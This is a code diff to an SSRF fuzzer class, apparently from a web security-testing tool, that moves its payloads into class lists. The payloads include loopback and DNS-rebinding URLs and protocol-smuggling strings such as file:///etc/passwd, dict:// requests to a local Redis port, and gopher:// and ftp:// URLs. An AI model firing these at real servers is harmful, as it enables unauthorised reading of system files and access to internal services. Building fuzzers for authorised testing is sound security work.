@@ -63,25 +63,28 @@ class SSRF(Fuzzer):
         "http://foo@<real>:80@<fake>",
     ]
 
+    localpayloads = [
+        "http://127.0.0.1",
+        "http://localhost",
+        "http://sudo.cc",  # 127.0.0.1
+        "http://127.0.0.1.xip.io",
+    ]
+
+    protopayloads = [
+        "file:///etc/passwd",
+        "dict://127.0.0.1:6379/info",
+        "gopher://127.0.0.1",
+        "ftp://user:pwd@127.0.0.1",
+    ]
+
     def __init__(self):
         super(SSRF, self).__init__()
 
-    @staticmethod
-    def testlocal():
-        payload = ["http://127.0.0.1"]
-        payload += ["http://localhost"]
-        payload += ["http://sudo.cc"]  # 127.0.0.1
-        payload += ["http://127.0.0.1.xip.io"]
-        for p in payload:
+    @classmethod
+    def fuzz(cls):
+        for p in cls.localpayloads:
             yield p
-
-    @staticmethod
-    def testproto():
-        payload += ["file:///etc/passwd"]
-        payload += ["dict://127.0.0.1:6379/info"]
-        payload += ["gopher://127.0.0.1"]
-        payload += ["ftp://user:pwd@127.0.0.1"]
-        for p in payload:
+        for p in cls.protopayloads:
             yield p
 
     @staticmethod
